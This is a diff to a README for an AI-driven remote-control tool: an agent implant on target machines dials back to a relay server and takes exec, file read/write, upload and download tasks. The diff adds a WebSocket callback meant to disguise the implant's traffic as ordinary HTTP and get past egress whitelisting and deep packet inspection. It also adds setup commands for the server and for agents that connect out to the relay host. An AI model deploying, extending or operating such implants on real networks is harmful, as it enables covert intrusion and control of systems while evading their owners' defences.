@@ -33,7 +33,7 @@ Local (AI / brain)                VPS (relay server)               Inner-network
 
 | Component | Description |
 |---|---|
-| `agent` | Executor: dials back to server, handles exec/read/write/list/info/upload/download/kill; Windows build embeds busybox (Unix-syntax exec) |
+| `agent` | Executor: dials back to server, handles exec/read/write/list/info/upload/download/kill; callbacks via TCP/TLS/ws/wss; Windows build embeds busybox (Unix-syntax exec) |
 | `server` | Controller: agent registry + control HTTP API + task routing |
 | `rtx` | CLI: dispatch tasks through the control API |
 | `rtxctl` | Convenience wrapper: token management, default agent, enter/exit/connect (TUI node picker) |
@@ -62,6 +62,12 @@ ssh -N -f -L 9001:127.0.0.1:9001 root@<vps>
 #   add -tls to server (auto-generates cert & prints pin fp); agent dials with -tls -pin <fp>
 ./server -l :9000 -t <token> --ctrl 127.0.0.1:9001 -tls
 ./agent-linux-amd64 -c <vps>:9000 -t <token> -i <name> -tls -pin <server-fp>
+
+# WebSocket callback (v1.2, for HTTP-whitelist/DPI egress):
+#   server: add -wsl :19080 (-tls makes it wss); agent dials with -c ws:// or -c wss://
+./server -l :9000 -t <token> --ctrl 127.0.0.1:9001 -wsl :19080
+./agent -c ws://<vps>:19080 -t <token> -i <name>          # ws (plaintext)
+./agent -c wss://<vps>:19080 -t <token> -tls -pin <fp>    # wss (TLS)
 
 # 4. Operate locally (rtxctl wraps token / default agent)
 rtxctl connect          # TUI picker → enter an execution environment
@@ -93,6 +99,7 @@ rtxctl upload -path /tmp/x -file ./local
 ## Changelog
 
 ### v1.2 (2026-09)
+- **Self-contained WebSocket callback (`ws://` / `wss://`)**: agents masquerade as HTTP/WebSocket traffic without any extra tunnel tool on the target — pierces HTTP-whitelist/DPI egress; wss (WS over TLS, reusing `-tls -pin` cert pinning) provides encryption. Multi-hop inner networks can still layer Stowaway port delivery.
 - **Windows agent embeds busybox**: run commands with **Unix syntax** on Windows targets (`ls`/`cat`/`grep`/`sed`/`wget`/pipes/`for` loops); paths use `C:/forward-slash` (`$TEMP` works) instead of low-level PowerShell/cmd; native Windows exes (`ipconfig`/`netstat`...) transparently run through busybox sh.
 - **Execution semantics fix**: removed the bridge to the local Kali execution backend in `rtxctl` — agent commands always run in the agent's **native OS** (Linux=bash / Windows=busybox sh or cmd), no longer assuming Kali semantics; use the local Kali environment for Kali toolchains.
 
